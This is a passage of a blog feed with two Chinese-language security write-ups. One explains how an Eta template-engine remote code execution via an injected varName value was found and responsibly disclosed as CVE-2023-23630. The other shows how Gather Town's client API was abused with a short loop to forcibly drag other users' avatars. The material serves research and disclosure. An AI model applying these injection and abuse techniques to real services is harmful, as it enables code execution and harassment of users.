<code>options.varName</code>，然後那在我的 <code>payload1</code> 裡面被改成了 <code>console.log("Ching367436")</code>。來看看這樣為何會有錯。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node_modules/eta/dist/eta.cjs:588</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">compile</span>(<span class="params">str, config</span>) {</span><br><span class="line">    <span class="keyword">var</span> options = <span class="title function_">getConfig</span>(config || {});</span><br><span class="line">    <span class="comment">/* ASYNC HANDLING */</span></span><br><span class="line">    <span class="comment">// The below code is modified from mde/ejs. All credit should go to them.</span></span><br><span class="line">    <span class="keyword">var</span> ctor = options.<span class="property">async</span> ? <span class="title function_">getAsyncFunctionConstructor</span>() : <span class="title class_">Function</span>;</span><br><span class="line">    <span class="comment">/* END ASYNC HANDLING */</span></span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">ctor</span>(options.<span class="property">varName</span>, <span class="string">'E'</span>, <span class="comment">// EtaConfig</span></span><br><span class="line">        <span class="string">'cb'</span>, <span class="comment">// optional callback</span></span><br><span class="line">        <span class="title function_">compileToString</span>(str, options)); <span class="comment">// eslint-disable-line no-new-func</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">catch</span> (e) {</span><br><span class="line">        <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="title class_">SyntaxError</span>) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="title class_">EtaErr</span>(<span class="string">'Bad template syntax\n\n'</span> +</span><br><span class="line">                e.<span class="property">message</span> +</span><br><span class="line">                <span class="string">'\n'</span> +</span><br><span class="line">                <span class="title class_">Array</span>(e.<span class="property">message</span>.<span class="property">length</span> + <span class="number">1</span>).<span class="title function_">join</span>(<span class="string">'='</span>) +</span><br><span class="line">                <span class="string">'\n'</span> +</span><br><span class="line">                <span class="title function_">compileToString</span>(str, options) +</span><br><span class="line">                <span class="string">'\n'</span> <span class="comment">// This will put an extra newline before the callstack for extra readability</span></span><br><span class="line">            );</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h5 id="ctor"><a href="#ctor" class="headerlink" title="ctor"></a><code>ctor</code></h5><p>上面的 <code>ctor</code> 相當於 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a>，把我們的東西放進 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a> 看看會發生什麼事。可以看到噴的錯誤訊息跟前面噴的 <code>Arg string terminates parameters early</code> 是一樣的。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>(<span class="string">'console.log("Ching367436")'</span>, <span class="string">'cb'</span>, res)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Error message</span></span><br><span class="line"><span class="title class_">Uncaught</span> <span class="title class_">SyntaxError</span>: <span class="title class_">Arg</span> string terminates parameters early</span><br></pre></td></tr></table></figure></div><h6 id="Function"><a href="#Function" class="headerlink" title="Function"></a><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a></h6><p>來看看 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a> 的各種用法。 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a> 的最後一個參數放的是 function body，前面幾個參數是要給那個 function body 的參數，可以看到最後出來的結果會回傳一個從字串變成的 function。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>(<span class="string">'a, b'</span>, <span class="string">'c'</span>, <span class="string">'console.log(a, b, c)'</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// output</span></span><br><span class="line">ƒ <span class="title function_">anonymous</span>(<span class="params">a, b,c</span></span><br><span class="line"><span class="params"></span>) {</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, c)</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><p>如果今天參數的部分被換成了不合理的值，像是下面這樣，就會噴出前面看到的錯。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>(<span class="string">'console.log(a, b, c)'</span>, <span class="string">'c'</span>, <span class="string">'console.log(a, b, c)'</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// output</span></span><br><span class="line"><span class="title class_">Uncaught</span> <span class="title class_">SyntaxError</span>: <span class="title class_">Arg</span> string terminates parameters early</span><br></pre></td></tr></table></figure></div><p>所以看到這邊，覺得控 <code>options.varName</code> 的路應該是沒辦法了，所以去找了其他可控的東西，可是也沒看到其他會被放進去的字串。所以在發表專題前就在這個裡面找了一個 ZeroDay XSS 跟已經有 CVE 的 <a class="link" href="https://securitylab.github.com/advisories/GHSL-2021-023-squirrelly/#technical-summary">Squirrelly ZeroDay RCE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，配上 Entroy 的 <a class="link" href="https://entroychang.github.io/2023/03/06/NodeJS-template-CVEs#ejs-template">EJS ZeroDay RCE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。還是成功的拿下了最佳專題。</p><h4 id="轉機"><a href="#轉機" class="headerlink" title="轉機"></a>轉機</h4><p>然後我的 <code>payload1</code> 其實只要 <code>varName</code> 的值前面加上 <code>a=</code>，<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a> 那裡就不會噴錯了，因為 <code>a=console.log(123)</code> 是合理的參數。</p><p>這樣就可以執行到前面的 <a href="#tryHandleCache"><code>tryHandleCache:8</code></a> 的 <code>templateFn(data, options, cb)</code>，<code>templateFn</code> 就是 <a href="#ctor"><code>ctor</code></a> 所產出的 function，所以這樣就 RCE 了。</p><p><img src="/ais3-2022-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/splitline-yyds.webp" alt="splitline"></p><h2 id="後續"><a href="#後續" class="headerlink" title="後續"></a>後續</h2><p>事後要把 Eta ZeroDay RCE 回報給作者，所以查了一下作者，結果看到他跟 <a class="link" href="https://squirrelly.js.org/">SquirrellyJS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是同個作者，然後兩個都有類似，甚至一模一樣的 RCE 的洞。</p><h3 id="回報"><a href="#回報" class="headerlink" title="回報"></a>回報</h3><p>回報的是 Github 上的洞，所以我先去看了 <a class="link" href="https://github.com/eta-dev/eta/security/policy">Eta 的 security policy <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，然後是空的。感覺這個也不太適合直接發 issue，最後在作者網站的 <a class="link" href="https://bengubler.com/#contact">Contact <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 那邊看到了聯絡管道，決定用寫信的來回報。</p><p>接著就要來寫漏洞報告了，想了一下要怎麼寫，想起之前 Cyku 大大回報的同個類型的<a class="link" href="https://github.com/pugjs/pug/issues/3312">洞 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。所以就照著把 proof of concept、detail、mitigation 三個部分寫了起來，最後寫出了<a class="link" href="https://hackmd.io/@Ching367436/SkkvuMAoi">這篇漏洞報告 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。然後就寄給作者了。</p><p>隔了一天後 Eta 推出了 <a class="link" href="https://github.com/eta-dev/eta/releases/tag/v2.0.0">v2.0.0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，Eta 發佈了 <a class="link" href="https://github.com/eta-dev/eta/security/advisories/GHSA-xrh7-m5pp-39r6">security advisory <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p>然後收到了作者的回信。</p><img src="/ais3-2022-最佳專題/eta-reply.webp" alt="Eta reply" style="width: 22em;"><p>又隔了兩天 Github 發給了這個洞 <a class="link" href="https://www.cve.org/CVERecord?id=CVE-2023-23630">CVE-2023-23630 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><img src="/ais3-2022-最佳專題/github-issued-cve.webp" alt="Github issued CVE" style="width: 22em;"><p>同一天出現了 <a class="link" href="https://www.cve.org/CVERecord?id=CVE-2022-25967">CVE-2022-25967 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的 <a class="link" href="https://github.com/advisories/GHSA-mf6x-hrgr-658f">security advisory <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。所以可能有人已經回報過這個洞了。在回報這個洞之前，我已先查過了作者，他因為有事，兩年無法維護開源專案，而 <a class="link" href="https://www.cve.org/CVERecord?id=CVE-2022-25967">CVE-2022-25967 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 正是那個期間的事情，所以可能才會被作者略過。我是挑在作者回來的時候回報的，所以作者馬上就修好這個洞了。</p><p>來看看他修補的 <a class="link" href="https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd">commit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，做的修改就是不再把 <a href="#renderFile"><code>renderFile</code></a> 的 <code>data</code> merge 進 <code>renderConfig</code> 裡面，所以 <code>renderConfig</code> 就變成了使用者不可控的東西，所以漏洞就確實被從根源修補好了。</p><h4 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h4><p>2023/01/26: 回報漏洞給作者。</p><p>2023/01/28: Eta 釋出 v2.0.0 修補了漏洞，發布 <a class="link" href="https://github.com/eta-dev/eta/security/advisories/GHSA-xrh7-m5pp-39r6">security advisory <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p>2023/01/30: Github 發給了這個漏洞 <a class="link" href="https://www.cve.org/CVERecord?id=CVE-2023-23630">CVE-2023-23630 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p>2023/01/30: <a class="link" href="https://www.cve.org/CVERecord?id=CVE-2022-25967">CVE-2022-25967 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的 <a class="link" href="https://github.com/advisories/GHSA-mf6x-hrgr-658f">security advisory <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 被發布了。</p><p>2023/04/08: 我把<a class="link" href="https://hackmd.io/@Ching367436/SkkvuMAoi">漏洞報告 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>公開。</p><h3 id="修補後的問題"><a href="#修補後的問題" class="headerlink" title="修補後的問題"></a>修補後的問題</h3><p>作者把洞修補好之後，就有東西開始壞掉了。</p><p><a class="link" href="https://github.com/eta-dev/eta/issues/215">2.0.0 breaks Express.js res.render views configuration <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 發生的原因在於 Eta 不會再從 Express 放下來的 <code>data</code> 去找 <code>config</code> 了。所以作者在文檔中把設定 template file 資料夾的的地方做了改動，也就是我畫起來的地方。來看看發生了什麼事。</p><p><img src="/ais3-2022-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/eta-2.0.0-release-note.webp" alt="Eta v2.0.0 release note"></p><h4 id="views"><a href="#views" class="headerlink" title="views"></a><code>views</code></h4><p>看到原本的 <code>app.set("views", "./views")</code> 被改成 <code>eta.configure({ views: "./views", cache: true })</code>。前者是設定了 Express 的 template file 的資料夾，不過到了 v2.0.0，Eta 不會再吃 Express 傳下來的這項資訊，所以作者要大家改成直接設定在 Eta 上面，Eta 才吃得到設定。可是這樣會變成 Express 那邊壞掉，因為 Express 也需要這項資訊。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Change THIS:</span></span><br><span class="line"><span class="keyword">var</span> eta = <span class="built_in">require</span>(<span class="string">"eta"</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">"view engine"</span>, <span class="string">"eta"</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">"views"</span>, <span class="string">"./views"</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">"view cache"</span>, <span class="literal">true</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// To THIS:</span></span><br><span class="line"><span class="keyword">var</span> eta = <span class="built_in">require</span>(<span class="string">"eta"</span>)</span><br><span class="line">eta.<span class="title function_">configure</span>({ <span class="attr">views</span>: <span class="string">"./views"</span>, <span class="attr">cache</span>: <span class="literal">true</span> })</span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">"eta"</span>, eta.<span class="property">renderFile</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">"view engine"</span>, <span class="string">"eta"</span>)</span><br></pre></td></tr></table></figure></div><h4 id="解決修補後的問題"><a href="#解決修補後的問題" class="headerlink" title="解決修補後的問題"></a>解決修補後的問題</h4><p>作者提出了兩個<a class="link" href="https://github.com/eta-dev/eta/issues/215#issuecomment-1409553251">解決方案 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p>第一個方案是 Eta 再去從 Express 傳下來的東西去拿這項資訊，不過這被我否決了，因為這樣做在<a class="link" href="https://github.com/eta-dev/eta/issues/215#issuecomment-1409697871">某些情況下會可以 RCE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p>第二個方案是叫使用者 Express 及 Eta 兩邊都設定一次同樣的東西，變成下面這樣。雖然比較麻煩，但這樣比較安全。我們最後決定採用這個，所以後來 v2.0.0 的 <a class="link" href="https://github.com/eta-dev/eta/releases/tag/v2.0.0">release note <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 更新成了現在的樣子。</p><p>我認為 Express 一開始在做 template engine 的接口時就該讓 <code>data</code>  <code>config</code> 分開，才不會造成現在那麼麻煩，以及引發這一類型問題。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// To THIS:</span></span><br><span class="line"><span class="keyword">var</span> eta = <span class="built_in">require</span>(<span class="string">"eta"</span>)</span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">"eta"</span>, eta.<span class="property">renderFile</span>)</span><br><span class="line">eta.<span class="title function_">configure</span>({  <span class="attr">views</span>: <span class="string">"./views"</span>, <span class="attr">cache</span>: <span class="literal">true</span> }) <span class="comment">// configure eta</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">"views"</span>, <span class="string">"./views"</span>) <span class="comment">// configure Express</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">"view cache"</span>, <span class="literal">true</span>) <span class="comment">// configure Express</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">"view engine"</span>, <span class="string">"eta"</span>)</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
    <summary type="html">今年在 AIS3 2022 研究了 Express JS 與 template engine 一起使用會有的資安問題。最後找到了 EJS ZeroDay RCE、Eta ZeroDay RCE&amp;XSS 以及一個已經有 CVE 的 Squirrelly ZeroDay RCE。我把我負責的 Eta ZeroDay RCE 回報給作者後，兩天內完成修補，取得 CVE-2023-23630 。隨後 CVE-2022-25967 的 security advisory 被發布，那其實是同個洞 / 類似的洞。</summary>
    
    
    
    <category term="AIS3" scheme="https://blog.ching367436.me/categories/AIS3/"/>
    
    <category term="最佳專題" scheme="https://blog.ching367436.me/categories/AIS3/%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/"/>
    
    
    <category term="ais3" scheme="https://blog.ching367436.me/tags/ais3/"/>
    
    <category term="express" scheme="https://blog.ching367436.me/tags/express/"/>
    
    <category term="template-engine" scheme="https://blog.ching367436.me/tags/template-engine/"/>
    
  </entry>
  
  <entry>
    <title>AIS3 2021 最佳專題</title>
    <link href="https://blog.ching367436.me/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/"/>
    <id>https://blog.ching367436.me/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/</id>
    <published>2023-04-04T22:44:39.000Z</published>
    <updated>2023-04-04T22:44:39.000Z</updated>
    
    <content type="html"><![CDATA[<!-- https://hackmd.io/@AIS3-official/AIS3-2021 --><!-- https://hackmd.io/@AIS3-official/20210801Group --><!-- https://hackmd.io/@AIS3-official/20210731Group --><p><a class="link" href="https://ais3.org/2021">AIS3 2021 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 因疫情採線上舉行。使用的線上場地是 <a class="link" href="https://www.gather.town/">Gather Town <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。而我的組的專題正是研究 Gather ，我們最後能夠對整個線上場地達到一定程度的控制，並且成功的拿下了這年的最佳專題。從競爭激烈的 AIS3 2021 拿下最佳專題可以說是很不容易的。<br>感謝當時隊友曾思維、陳力瑋、李明謙的幫忙。</p><blockquote><p>Gather Town 是一個視訊會議平台，可以讓使用者建立和自訂虛擬空間，用於線上活動、會議和社交聚會。它提供一個二維世界，讓使用者可以移動他們的虛擬角色並透過視訊、音訊和聊天與其他人實時互動。</p><footer><strong>ChatGPT 2023.04.06</strong></footer></blockquote><h2 id="專題"><a href="#專題" class="headerlink" title="專題"></a>專題</h2><h3 id="觀察"><a href="#觀察" class="headerlink" title="觀察"></a>觀察</h3><p>在我們使用 Gather 的時候，發現有個 feature 叫做 <code>Start bubble</code>。<code>Start bubble</code> 的作用是讓在 bubble 裡面的人可以講悄悄話，讓外面的人聽不到。在使用這個 feature 的時候我的隊友曾思維發現 <code>Start bubble</code> 其實有個副作用，那就是他會讓 <code>Start bubble</code> 的雙方靠向對方，就像下面這樣。</p><video muted="" controls="" style="width: 100%;">  <source src="/ais3-2021-最佳專題/start-bubble-zoom.mp4" type="video/mp4">  <source src="/ais3-2021-最佳專題/start-bubble-zoom.webm" type="video/webm"></video><p>這個靠近對方是雙方都會有的，意思是即使對方不想我們還是可以稍微控制到對方。這時我們就開始研究 <code>Start bubble</code> 到底是怎麼 Start 的。</p><h3 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h3><p>Gather 是運作在 browser 上的，所以很自然的我們早已開好 BurpSuite。發現在 websocket 裡有一堆東西，透過重複的 <code>Start bubble</code>，嘗試著找出  <code>Start bubble</code> 到底是從那個封包傳出去的，最後看到了一個裡面有 whisper 內容的封包。感覺就是它了。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/websocket.webp" alt="websocket"></p><h4 id="Replay"><a href="#Replay" class="headerlink" title="Replay"></a>Replay</h4><p>如果說 <code>Start bubble</code> 一次會然對方往自己靠近一次，那如果是 <code>Start bubble</code> 很多次呢？所以我們就把這個封包送了很多次，結果…</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/%E5%82%85%E6%96%87%E5%AE%97%E5%8A%A9%E6%95%99%E8%A2%AB%E6%8A%93%E8%B5%B0%E4%BA%86.webp" alt="傅文宗助教被抓走了"></p><p>助教被我們抓走了 XD</p><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>每次都要去 BurpSuite 抓封包是很花時間的，而且可能抓到封包沒多久 websocket 就斷開了，如果真的要把這個做成有用的東西就不能只有這樣。</p><p>此時我的隊友，<a class="link" href="https://nycu.moe/about.html">交大 VTuber 社 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的社長李明謙從 console 看到了一些有趣的東西。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/console.webp" alt="console"></p><p>這看起來不就是處理 websocket 的東西的 log 嗎 (<code>wss://</code>)？就直接點進去看看，然後看到了一堆被 minify 後的 JavaScript ，看起來很難看。然後旁邊也有一堆連名稱也混淆過的 JavaScript 檔案。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/js-bundle.png" alt="js-bundle"></p><p>不過既然已經知道關鍵字是 whisper 就在那些東西裡面用 ^F 找找看，然後就找到了可疑的地方。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/js-whisper.png" alt="js-whisper"></p><p>這個時候把這裡下個斷點，然後就來 <code>Start bubble</code> ，結果撞到斷點了！</p><p>從這邊的 call stack 慢慢往上找，找到了超級有趣的東西。我們找到的東西叫做 Gather 的 JavaScript 的 API!</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/stack.png" alt="stack"></p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>我們找到了 <code>gameSpace</code> 這個 API ，裡面有很多有用的東西。</p><h4 id="gameSpace-whisper"><a href="#gameSpace-whisper" class="headerlink" title="gameSpace.whisper"></a>gameSpace.whisper</h4><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gameSpace.<span class="title function_">whisper</span>(<span class="string">"&lt;userId&gt;"</span>, &lt;directionNum&gt;)</span><br></pre></td></tr></table></figure></div><p>上面這個東西只要直接呼叫就有 <code>Start bubble</code> 的效果，只要一直呼叫就會一直 <code>Start bubble</code> ，就可以把別人拉走。這個就是我們要找的東西。</p><p>不過我們沒有 <code>"&lt;userId&gt;"</code> 要怎麼辦呢？<code>gameSpace</code> 其實也有提供。</p><h4 id="gameSpace-gameState"><a href="#gameSpace-gameState" class="headerlink" title="gameSpace.gameState"></a>gameSpace.gameState</h4><p><code>gameSpace.gameState</code> 裡面存放的東西就是使用者資料。比如像是下面第一筆 <code>"0ZixhCkm0nc0HGGJvI9bG5aDiDD2"</code> 這串奇怪的東西就是前面提到我們需要的 <code>"&lt;userId&gt;"</code> ，底下的 <code>"name"</code> 就是使用者設定的姓名。所以現在有  <code>"name"</code> 跟 <code>"&lt;userId&gt;"</code> 的 mapping 了。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">    <span class="string">"0ZixhCkm0nc0HGGJvI9bG5aDiDD2"</span>: {</span><br><span class="line">        <span class="string">"x"</span>: <span class="number">24</span>,</span><br><span class="line">        <span class="string">"y"</span>: <span class="number">17</span>,</span><br><span class="line">        <span class="string">"direction"</span>: <span class="number">5</span>,</span><br><span class="line">        <span class="string">"ghost"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">"sprite"</span>: <span class="number">434</span>,</span><br><span class="line">        <span class="string">"spotlighted"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">"emote"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">"workCondition"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">"activelySpeaking"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">"busy"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">"lastInputId"</span>: <span class="number">921</span>,</span><br><span class="line">        <span class="string">"isSignedIn"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">"map"</span>: <span class="string">"new_project_room_3"</span>,</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"(´･ω･`)"</span>,</span><br><span class="line">        <span class="string">"affiliation"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"textStatus"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"emojiStatus"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"whisperId"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"outfitString"</span>: <span class="string">"..."</span></span><br><span class="line">    },</span><br><span class="line">    <span class="string">"2bNrgc75L0hLUO9gSq94Yc9q7Ia2"</span>: {</span><br><span class="line">        ...</span><br><span class="line">    },</span><br><span class="line">    ...</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><p>觀察到這邊，我們就已經可以實作出強制拉人的東西了，不過時間也很晚了，該來睡覺了。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/orange-sleep.png" alt="orange-sleep"></p><h3 id="實戰"><a href="#實戰" class="headerlink" title="實戰"></a>實戰</h3><p>有了上面那些東西，我隔天起來就把它做成工具，結果大概像下面這樣，把所有的隊友都全部拉過來了。</p><video controls="" muted="" style="width: 100%;">    <source src="/ais3-2021-最佳專題/force-follow-1080.mp4" type="video/mp4">    <source src="/ais3-2021-最佳專題/force-follow.mp4" type="video/mp4"></video><p>當然，可以拉一個人就可以拉所有人，不過我們沒有實際去做，怕影響到其他人。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> userId <span class="keyword">in</span> gameSpace.<span class="property">gameState</span> ) {</span><br><span class="line">    gameSpace.<span class="title function_">whisper</span>(userId, <span class="number">0</span>)</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><p>我們也有去問主辦方說可不可以做一些 live demo 之類的，不過主辦方沒有給一個明確的可以，所以最後我們發表的時候是使用預錄好的影片。還被評審稱讚我們很有道德。</p><h4 id="貪食蛇"><a href="#貪食蛇" class="headerlink" title="貪食蛇"></a>貪食蛇</h4><p>看到有人正在利用 <code>follow</code> 這個 feature 來做貪食蛇，原理就是一排人分別去 <code>follow</code> 前面的一個人，這樣就會有連在一起的效果，然後我看到了覺的很有趣，就用做好的工具把他們的頭拉過來，我就變成頭了。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/snake.webp" alt="snake"></p><p>後來看到發表專題的時候有人提到了貪食蛇反玩，感覺很有趣，不過其實有更有趣的東西，我們可以做到讓兩個以上不相干的人互拉（隱蔽式拉人，隊友曾思維發現），也就是說可以讓一群人不用作任何動作就強制形成貪食蛇。</p><img src="/ais3-2021-最佳專題/貪食蛇反玩.webp" alt="貪食蛇反玩" style="width: 22em;"><h4 id="Teleport"><a href="#Teleport" class="headerlink" title="Teleport"></a>Teleport</h4><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gameSpace.<span class="title function_">teleport</span>(&lt;x&gt;,&lt;y&gt;,<span class="string">"&lt;map_id&gt;"</span>=<span class="string">"&lt;current_map&gt;"</span>)</span><br></pre></td></tr></table></figure></div><p>我們還發現了有瞬間移動的 API ，我的隊友陳力瑋把這個東西實做成更好用的東西，把他加到了 <code>clickInteraction</code> 